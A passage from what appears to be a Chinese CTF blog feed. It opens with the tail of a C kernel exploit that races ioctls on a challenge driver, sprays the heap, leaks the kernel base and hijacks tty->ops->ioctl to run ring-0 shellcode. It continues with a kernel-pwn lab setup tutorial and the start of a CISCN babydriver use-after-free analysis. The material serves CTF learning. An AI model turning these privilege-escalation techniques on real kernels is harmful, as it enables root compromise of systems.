mp;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; thread_num; i++)</span><br><span class="line">		<span class="keyword">if</span> (pthread_create(&amp;tid[i], <span class="literal">NULL</span>, race_kill, <span class="literal">NULL</span>) != <span class="number">0</span>)</span><br><span class="line">			error_quit(<span class="string">"pthread_create error"</span>);</span><br><span class="line">	ioctl(fd, test_ioctl_write, &amp;data);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; thread_num; i++)</span><br><span class="line">		pthread_join(tid[i],<span class="literal">NULL</span>);</span><br><span class="line">	data.size = <span class="number">0x2c0</span>;</span><br><span class="line">	ioctl(fd, test_ioctl_read, &amp;data);</span><br><span class="line">        <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)mp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_through</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> write_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> wfd;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *buf;</span><br><span class="line">	ret = posix_memalign((<span class="keyword">void</span> **)&amp;buf, <span class="number">512</span>, <span class="number">1024</span>);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		error_quit(<span class="string">"posix_memalign failed"</span>);</span><br><span class="line">	*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)buf = write_addr;</span><br><span class="line">	wfd = open(<span class="string">"./data"</span>, O_WRONLY | O_DIRECT | O_CREAT, <span class="number">0755</span>);</span><br><span class="line">	<span class="keyword">if</span> (wfd == <span class="number">-1</span>)</span><br><span class="line">		error_quit(<span class="string">"open data failed"</span>);</span><br><span class="line">	<span class="keyword">if</span> (write(wfd, buf, <span class="number">1024</span>) &lt; <span class="number">0</span>)</span><br><span class="line">		error_quit(<span class="string">"write data failed"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(buf);</span><br><span class="line">	close(wfd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">race_write</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">pthread_t</span> tid[thread_num];</span><br><span class="line">	<span class="keyword">int</span> wfd = open(<span class="string">"./data"</span>,O_RDWR);</span><br><span class="line">	<span class="keyword">if</span> (wfd == <span class="number">-1</span>)</span><br><span class="line">		error_quit(<span class="string">"open data failed"</span>);</span><br><span class="line">	<span class="keyword">char</span> *p = mmap(<span class="literal">NULL</span>,<span class="number">4096</span>,PROT_READ,MAP_PRIVATE,wfd,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (p == MAP_FAILED)</span><br><span class="line">		error_quit(<span class="string">"data mmap failed"</span>);</span><br><span class="line">	data.buf = (<span class="keyword">void</span> *)p;</span><br><span class="line">	data.size = <span class="number">0x2c0</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; thread_num; i++)</span><br><span class="line">		<span class="keyword">if</span> (pthread_create(&amp;tid[i], <span class="literal">NULL</span>, race_kill, <span class="literal">NULL</span>) != <span class="number">0</span>)</span><br><span class="line">			error_quit(<span class="string">"pthread_create error"</span>);	</span><br><span class="line">	ioctl(fd, test_ioctl_read, &amp;data);	</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; thread_num; i++)</span><br><span class="line">		pthread_join(tid[i],<span class="literal">NULL</span>);</span><br><span class="line">	ptmx = open(<span class="string">"/dev/ptmx"</span>,O_RDWR);</span><br><span class="line">	close(wfd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">heap_spray</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">void</span> *mp;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; spray_times; i++)</span><br><span class="line">	&#123;</span><br><span class="line">        	<span class="keyword">if</span> ((mp = mmap(<span class="literal">NULL</span>, mp_size, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span> )) == MAP_FAILED)</span><br><span class="line">                	error_quit(<span class="string">"mmap error"</span>);</span><br><span class="line">		<span class="built_in">memset</span>(mp, <span class="number">0</span>, mp_size);</span><br><span class="line">		spray[i] = mp;</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> *<span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; spray_times; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> *p = spray[i];</span><br><span class="line">		<span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (j &lt; mp_size/<span class="number">8</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (p[j] != <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">return</span> &amp;p[j];</span><br><span class="line">			j += <span class="number">512</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_ptmx_slave</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *pts_name;</span><br><span class="line">	<span class="keyword">if</span> (grantpt(ptmx) &lt; <span class="number">0</span> || unlockpt(ptmx) &lt; <span class="number">0</span>) </span><br><span class="line">		error_quit(<span class="string">"grantpt and unlockpt fail\n"</span>);</span><br><span class="line"></span><br><span class="line">	pts_name = (<span class="keyword">const</span> <span class="keyword">char</span> *)ptsname(ptmx);</span><br><span class="line">	<span class="keyword">int</span> fds = open(pts_name, O_RDONLY | O_NOCTTY);</span><br><span class="line">	<span class="keyword">if</span> (fds &lt; <span class="number">0</span>) </span><br><span class="line">		error_quit(<span class="string">"open /dev/ptmx fail\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> fds;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// int t[0x100];</span></span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">/* for (i = 0; i &lt; 0x100; i++)</span></span><br><span class="line"><span class="comment">	&#123;</span></span><br><span class="line"><span class="comment">		t[i] = open("/dev/ptmx",O_RDWR);</span></span><br><span class="line"><span class="comment">		if (t[i] == -1)</span></span><br><span class="line"><span class="comment">			error_quit("open ptmx error");</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">	for (i = 0; i &lt; 0x100; i++)</span></span><br><span class="line"><span class="comment">		close(t[i]);</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> slab_addr;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line">	<span class="keyword">int</span> pts;</span><br><span class="line">        <span class="keyword">if</span> ((fd = open(<span class="string">"/dev/test"</span>,O_RDWR)) == <span class="number">-1</span>)</span><br><span class="line">		error_quit(<span class="string">"open test.ko error"</span>);</span><br><span class="line">	slab_addr = race_read();</span><br><span class="line">	<span class="keyword">if</span> (slab_addr &lt; <span class="number">0xff000000000000</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">		<span class="built_in">sprintf</span>(buf, <span class="string">"%s:0x%lx"</span>,<span class="string">"slab addr failed"</span>,slab_addr);</span><br><span class="line">		ex(buf);</span><br><span class="line">	&#125;</span><br><span class="line">	slab_addr = slab_addr | <span class="number">0xff00000000000000</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"slab_addr:0x%lx\n"</span>,slab_addr);</span><br><span class="line">	slab_addr = slab_addr &amp; <span class="number">0xffffffffff000000</span>;</span><br><span class="line">	heap_spray();</span><br><span class="line">	write_through(slab_addr);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> *p = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">while</span> (i++ &lt; <span class="number">0x1000</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		race_write();</span><br><span class="line">		p = check();</span><br><span class="line">		<span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">goto</span> get_root;</span><br><span class="line">		close(ptmx);</span><br><span class="line">	&#125;</span><br><span class="line">	ex(<span class="string">"physmap_addr not found"</span>);</span><br><span class="line">get_root:</span><br><span class="line">	kernel_base = p[<span class="number">3</span>] - kernel_offset;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"physmap_addr:%p = 0x%lx\n"</span>, p, slab_addr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"kernel base:0x%lx\n"</span>, kernel_base);</span><br><span class="line">	pts = get_ptmx_slave();</span><br><span class="line">	p[<span class="number">3</span>] = slab_addr + <span class="number">0x300</span>;</span><br><span class="line">	p[<span class="number">0x300</span>/<span class="number">8</span>+<span class="number">12</span>] = kernel_base + set_memory_x;	<span class="comment">// tty-&gt;ops-&gt;ioctl = set_memory_x</span></span><br><span class="line">	ioctl(pts,<span class="number">0x2333</span>,<span class="number">1</span>);</span><br><span class="line">	p[<span class="number">0x300</span>/<span class="number">8</span>+<span class="number">12</span>] = slab_addr + <span class="number">0x400</span>;		<span class="comment">// tty-&gt;ops-&gt;ioctl = shellcode</span></span><br><span class="line">	<span class="built_in">memset</span>((<span class="keyword">char</span> *)p+<span class="number">0x400</span>, <span class="number">0x90</span>, <span class="number">0x100</span>);		<span class="comment">// place your shellcode here, it will run in ring0. gl hf.</span></span><br><span class="line">	getchar();</span><br><span class="line">	ioctl(pts,<span class="number">0x2333</span>,<span class="number">1</span>);	</span><br><span class="line">	close(fd);</span><br><span class="line">	close(pts);</span><br><span class="line">	close(ptmx);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>这种攻击非常非常类似于去年TSCTF鸡哥出的题，同样都是堆喷，同样都是改一个值之后爆破打印确定其位置，再次膜<code>w1tcher</code>和<code>p4nda</code>师傅。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这篇文章断断续续写了两个月大概，写kernel的exp太累，尤其是多线程/进程不好调试的题目，收获到了很多东西，todolist本来还有n1ctf的一道题，但是看了题解觉得自己的功力还不够，下一步的目标是复现两个想了很久的内核CVE。不知不觉已经正月十五了，寒假又废了，希望这俩CVE对我好一点qwq。</p>
]]></content>
  </entry>
  <entry>
    <title>kernel_pwn</title>
    <url>/2020/09/03/kernel-pwn/</url>
    <content><![CDATA[<h1 id="Kernel-Pwn环境搭建"><a href="#Kernel-Pwn环境搭建" class="headerlink" title="Kernel Pwn环境搭建"></a>Kernel Pwn环境搭建</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>自从上次简单地学了一下kernel之后已经很久没碰了，再捡起来发现还是蛮费劲的，还是写篇博客记录一下环境的搭建，本篇主要参考17、p4nda师兄和x3h1n师姐的博客，中间查了些别的资料，汇总成一篇大杂烩供自己翻阅hh</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>调试kernel有几种方式，真实漏洞环境大多用Vmware双机调试，或者kvm/qemu，这里介绍CTF里最常用到的qemu方式搭建kernel pwn环境。</p>
<h3 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h3><ol>
<li>下载指定版本的Linux内核，我是从<a href="https://mirrors.edge.kernel.org/pub/linux/kernel/" target="_blank" rel="noopener">这里</a>下载的</li>
<li><p>解压源码目录，内核编译前的配置，这里用图像化配置方式<code>make menuconfig</code>，有几个选项要勾选(默认应该都会选中)(要先安装<code>sudo apt-get install libncurses5-dev</code>)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. kernel hacking-&gt;</span><br><span class="line">Kernel debugging</span><br><span class="line">Compile-time checks and compiler options —&gt; Compile the kernel with debug info和Compile the kernel with frame pointers</span><br><span class="line">KGDB</span><br><span class="line">2. save-&gt;exit-&gt;exit</span><br></pre></td></tr></table></figure>
</li>
<li><p>make -j4(编译前可能要安装库<code>sudo apt-get install libssl-dev</code>)(编译低版本的内核需要切换低版本的gcc，方法如下)<br>3.1 <code>sudo apt-get install gcc-4.4</code><br>3.2 <code>sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-x x</code><br>3.3 <code>sudo update-alternatives --config gcc</code></p>
</li>
<li>make modules_install </li>
<li>make install </li>
</ol>
<p>之后就可以在<code>./arch/x86_64/boot/bzImage</code>下可以找到bzImage文件，从源码根目录可以拿到vmlinux(bzImage是vmlinuz经过gzip压缩的文件，适用于大内核，vmlinux是静态编译的未压缩的内核，可以在其中找ROP)</p>
<h3 id="编译busybox"><a href="#编译busybox" class="headerlink" title="编译busybox"></a>编译busybox</h3><p>启动一个Linux系统除了需要内核外还需要一些必要的命令和文件系统，busybox可以提供这样一个小型的操作系统，可以从<a href="https://busybox.net/downloads/" target="_blank" rel="noopener">官网</a>下载Busybox源码自行编译，这里我选择的是1.30.1，编译前使用<code>make menuconfig</code>将编译选项设置为静态编译<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br><span class="line">make make install</span><br></pre></td></tr></table></figure></p>
<p>将生成的_install 文件夹拷贝到linux kernel 源代码根目录</p>
<h3 id="生成文件系统"><a href="#生成文件系统" class="headerlink" title="生成文件系统"></a>生成文件系统</h3><p>进入_install目录，创建文件夹)(-p为不存在则创建)<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir etc</span><br><span class="line">mkdir dev</span><br><span class="line">mkdir mnt</span><br><span class="line">mkdir -p etc/init.d/</span><br><span class="line">mkdir home</span><br><span class="line">mkdir root</span><br><span class="line">touch etc/passwd</span><br><span class="line">touch etc/group</span><br></pre></td></tr></table></figure></p>
<p>创建./etc/init.d/rcS文件(可以看成系统启动的初始化文件)<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir -p /proc</span><br><span class="line">mkdir -p /tmp</span><br><span class="line">mkdir -p /sys</span><br><span class="line">mkdir -p /mnt</span><br><span class="line">/bin/mount -a</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line">echo /sbin/mdev &gt; /proc/sys/kernel/hotplug</span><br><span class="line">mdev -s</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh #normal user</span><br><span class="line">insmod vul.ko</span><br></pre></td></tr></table></figure></p>
<p><code>chmod +x rcS</code><br>创建./etc/fatab文件(用fstab可以自动挂载各种文件系统格式的硬盘、分区、可移动设备和远程设备等)<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proc /proc proc defaults 0 0</span><br><span class="line">tmpfs /tmp tmpfs defaults 0 0</span><br><span class="line">sysfs /sys sysfs defaults 0 0</span><br><span class="line">tmpfs /dev tmpfs defaults 0 0</span><br></pre></td></tr></table></figure></p>
<p>创建etc/inittab文件(在特定情况下执行的命令，如最后一条是关机的时候卸载所有挂载文件系统)<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">::respawn:-/bin/sh</span><br><span class="line">::askfirst:-/bin/sh</span><br><span class="line">::ctrlaltdel:/bin/umount -a -r</span><br></pre></td></tr></table></figure></p>
<p>在dev/创建设备节点(创建两个字符设备)<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mknod ./dev/console c 5 1</span><br><span class="line">sudo mknod ./dev/null c 1 3</span><br></pre></td></tr></table></figure></p>
<p>创建文件系统，在_install文件夹中执行<br><code>find . -print0 | cpio --null -ov --format=newc | gzip -9 &gt; ../initramfs.img</code></p>
<h3 id="qemu启动Linux-kernel"><a href="#qemu启动Linux-kernel" class="headerlink" title="qemu启动Linux kernel"></a>qemu启动Linux kernel</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 -kernel ./linux-4.4.72/arch/x86_64/boot/bzImage --nographic -initrd ./busybox-1.30.1/initramfs.img -m 256M -append &quot;rdinit=./linuxrc -gdb tcp::1234 -S</span><br></pre></td></tr></table></figure>
<h3 id="gdb远程调试"><a href="#gdb远程调试" class="headerlink" title="gdb远程调试"></a>gdb远程调试</h3><p>gdb remote 127.0.0.1:1234即可，注意要先设置arch，<code>set arch i386:x86-64:intel</code>，否则会有g pack too long的报错，</p>
<h3 id="在指定内核中编写驱动程序"><a href="#在指定内核中编写驱动程序" class="headerlink" title="在指定内核中编写驱动程序"></a>在指定内核中编写驱动程序</h3><p>linux内核编译前我们用make menuconfig在源码目录生成了一个配置文件.config，这个配置文件表明了内核编译中的一些设置，比如我编译的4.4.72内核默认开启了栈保护，所以七哥栈溢出例子编译之后会有canary和NX，这个是内核决定的，因此要关闭保护只能重新编译内核和驱动(叹气)(后续：重新编译了一次，内核去掉了所有保护，但是驱动仍然有NX，放弃辽)</p>
<p>流程：建个新的文件夹，Makefile:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">obj-m := sbof.o</span><br><span class="line">ROOTDIR  := /path/to/linux/src</span><br><span class="line">PWD   := $(shell pwd)</span><br><span class="line"></span><br><span class="line">default:</span><br><span class="line">	$(MAKE) -C $(ROOTDIR) M=$(PWD) modules</span><br><span class="line">	$(CC) --static -o exploit exploit.c</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">	$(MAKE) -C $(ROOTDIR) M=$(PWD) clean</span><br><span class="line">	rm exploit</span><br></pre></td></tr></table></figure>
<p>编译完成之后放到busybox的_install里重新打包，之后就可以调试了</p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>gdb进去之后<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file ./vmlinux</span><br><span class="line">set architecture i386:x86-64:intel</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure></p>
<p>如果给的文件里只有bzImage可以自己提取，<a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux" target="_blank" rel="noopener">脚本地址</a><br>在qemu中查看加载的程序基址<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat /sys/modules/sbof/sections/.text</span><br></pre></td></tr></table></figure></p>
<p>在gdb中添加符号文件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add-symbol-file ./sbof.ko 0xffffffc0000000</span><br></pre></td></tr></table></figure></p>
<p>查看commit_creds和prepare_kernel_cred函数的地址<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat /proc/kallsyms | grep commit_creds</span><br><span class="line">cat /proc/kallsyms | grep prepare_kernel_cred</span><br></pre></td></tr></table></figure></p>
<h3 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h3><p>/proc文件系统是一个虚拟文件系统，可以在/proc中动态创建虚拟文件，通过对虚拟文件的读写与实现与内核的通信。可以使用以下函数创建虚拟文件</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//第三个参数是文件在/proc中的位置，默认为/proc</span></span><br><span class="line"><span class="function">struct proc_dir_entry *<span class="title">create_proc_entry</span><span class="params">( <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">mode_t</span> mode, struct proc_dir_entry *parent )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct proc_dir_entry *<span class="title">proc_create</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">umode_t</span> mode, struct proc_dir_entry *parent,<span class="keyword">const</span> struct file_operations *proc_fops)</span></span></span><br></pre></td></tr></table></figure>
<p>kptr_restrict控制/proc/kallsyms是否显示symbols的地址，通常会在init文件中给出限制：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br></pre></td></tr></table></figure></p>
<p>dmesg_restrict限制非特权用户读取dmesg信息，无法访问内核打印的消息，通常会在init文件中给出限制：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br></pre></td></tr></table></figure>
<h3 id="kernel-pwn保护机制"><a href="#kernel-pwn保护机制" class="headerlink" title="kernel pwn保护机制"></a>kernel pwn保护机制</h3><h4 id="KASLR"><a href="#KASLR" class="headerlink" title="KASLR"></a>KASLR</h4><p>内核地址随机化，相当于ASLR(并非默认启用，需要在内核命令行中加入kaslr开启)</p>
<h4 id="SMAP-SMEP"><a href="#SMAP-SMEP" class="headerlink" title="SMAP/SMEP"></a>SMAP/SMEP</h4><p>SMAP(Supervisor Mode Access Prevention，管理模式访问保护):<br>禁止内核访问用户空间的数据</p>
<p>SMEP类似于NX，即内核态无法执行shellcode,linux内核从3.0开始支持SMEP，3.7开始支持SMAP。</p>
<h4 id="Stack-Protector"><a href="#Stack-Protector" class="headerlink" title="Stack Protector"></a>Stack Protector</h4><p>在编译内核时设置CONFIG_CC_STACKPROTECTOR选项，即可开启该保护，一般而言开了这个保护再编译驱动会发现有canary。</p>
<h2 id="Kernel-UAF"><a href="#Kernel-UAF" class="headerlink" title="Kernel UAF"></a>Kernel UAF</h2><h3 id="CISCN-babydriver"><a href="#CISCN-babydriver" class="headerlink" title="CISCN-babydriver"></a>CISCN-babydriver</h3><h4 id="驱动逻辑"><a href="#驱动逻辑" class="headerlink" title="驱动逻辑"></a>驱动逻辑</h4><p>因为是第一次分析，所以写的详细一点，从_init函数开始，首先用alloc_chrdev_region函数动态分配一个设备号，成功分配的话初始化一个cdev结构体(每个字符设备对应一个结构体)，_class_create注册一个字符设备，创建相应的class，再调用device_create创建对应的设备，注意每个地方失败都会有回滚操作(destroy或者unregister)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">babydriver_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> *<span class="title">v2</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)alloc_chrdev_region(&amp;babydev_no, <span class="number">0L</span>L, <span class="number">1L</span>L, <span class="string">"babydev"</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    cdev_init(&amp;cdev_0, &amp;fops);</span><br><span class="line">    cdev_0.owner = &amp;_this_module;</span><br><span class="line">    v1 = cdev_add(&amp;cdev_0, babydev_no, <span class="number">1L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = (class *)_class_create(&amp;_this_module, <span class="string">"babydev"</span>, &amp;babydev_no);</span><br><span class="line">      babydev_class = v2;</span><br><span class="line">      <span class="keyword">if</span> ( v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = device_create(v2, <span class="number">0L</span>L, babydev_no, <span class="number">0L</span>L, <span class="string">"babydev"</span>);</span><br><span class="line">        v0 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v3 )</span><br><span class="line">          <span class="keyword">return</span> v0;</span><br><span class="line">        printk(&amp;unk_351);</span><br><span class="line">        class_destroy(babydev_class);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        printk(&amp;unk_33B);</span><br><span class="line">      &#125;</span><br><span class="line">      cdev_del(&amp;cdev_0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_327);</span><br><span class="line">    &#125;</span><br><span class="line">    unregister_chrdev_region(babydev_no, <span class="number">1L</span>L);</span><br><span class="line">    <span class="keyword">return</span> v1;</span><br><span class="line">  &#125;</span><br><span class="line">  printk(&amp;unk_309);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>_exit是设备卸载时候的会调用的，把分配的设备和class等回收。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">babydriver_exit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  device_destroy(babydev_class, babydev_no);</span><br><span class="line">  class_destroy(babydev_class);</span><br><span class="line">  cdev_del(&amp;cdev_0);</span><br><span class="line">  unregister_chrdev_region(babydev_no, <span class="number">1L</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>open函数的参数有inode和filp，每一个设备都会对应一个inode，而且是共享一个inode，这个不像filp文件指针每次打开一个设备都会创建一个新的文件指针以供操作(内核里的文件指针，跟用户态不一样)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">babyopen</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  babydev_struct.device_buf = (<span class="keyword">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">0x40</span>LL);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">0x40</span>LL;</span><br><span class="line">  printk(<span class="string">"device open\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>read函数是从内核往用户态读数据，kernel里的文件结构体定义了一组基础接口，允许开发者按照参数的标准实现一套自己的函数，read write open release(close)都是自己实现的，这里的read判断babydev_struct.device_buf不为NULL就将用户输入的第三个参数length长的数据从device_buf拷贝到Buffer里</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">babyread</span><span class="params">(file *filp, <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  result = <span class="number">-2L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_to_user(buffer);</span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>write是从用户态拷贝length长的数据到babydev_struct.device_buf里，这里的IDA反汇编优点问题，看asm可以看到copy_from_user的参数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">babywrite</span><span class="params">(file *filp, <span class="keyword">const</span> <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  result = <span class="number">-2L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = 